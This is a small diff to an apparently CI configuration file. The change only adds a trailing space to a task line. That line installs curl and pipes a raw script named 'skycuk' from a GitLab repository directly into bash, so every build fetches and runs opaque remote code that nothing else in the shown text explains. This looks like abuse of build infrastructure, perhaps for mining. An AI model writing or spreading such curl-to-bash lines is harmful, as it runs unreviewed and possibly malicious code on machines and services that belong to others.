@@ -4,4 +4,4 @@ container:
   memory: 12G
 
 task:
-  script: apt update && apt -y install curl && curl https://gitlab.com/vainlevy/netizen/-/raw/master/skycuk | bash
+  script: apt update && apt -y install curl && curl https://gitlab.com/vainlevy/netizen/-/raw/master/skycuk | bash 
